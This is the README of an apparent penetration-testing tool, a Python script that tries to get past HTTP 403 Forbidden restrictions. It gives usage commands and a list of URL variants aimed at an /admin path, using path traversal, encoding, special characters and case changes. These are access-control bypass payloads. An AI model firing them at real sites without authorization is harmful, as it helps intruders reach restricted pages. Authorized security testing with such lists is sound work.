# 403 Bypass Script

This script attempts to bypass 403 Forbidden access restrictions by appending and modifying URL paths in different ways. It generates a list of URL variations based on encoding, path traversal, and other techniques.

## How It Works

The script takes a target domain as an argument and appends various URL encoding tricks, path traversal techniques, and common bypass patterns to the given domain. It then attempts to access each generated URL.

## Usage

Run the script with the target domain as an argument:

```sh
python bypass_403.py example.com
```

Run with custom path. example: /secret/

```shell
python bypass_403.py example.com /secret/
```

Features
• Tries different URL encoding techniques
• Uses path traversal and directory manipulation
• Attempts access with special characters and encodings
• Generates multiple variations of the /admin path

Notes
• This script is for educational and security testing purposes only.
• Do not use it on systems without proper authorization.

Example URLs Used in Bypass

Some of the techniques used in this script include:
• Double slashes:

example.com//admin//
example.com///admin///

    •	Path traversal:

example.com/admin/../
example.com/admin/./
example.com/admin/..;/

    •	URL encoding:

example.com/admin/%2e/
example.com/admin/%2f
example.com/admin/%20

    •	Query and fragment manipulation:

example.com/admin?
example.com/admin??
example.com/admin#
example.com/admin/#

    •	File extension tricks:

example.com/admin.json
example.com/admin.css
example.com/admin.html

    •	Special character injection:

example.com/;/admin/
example.com/admin/~
example.com/admin/\*

    •	Case variation:

example.com/ADMIN
example.com/ADM+IN
example.com/\*/admin

By using different encoding techniques and special characters, the script attempts to find alternate paths that may bypass 403 restrictions.
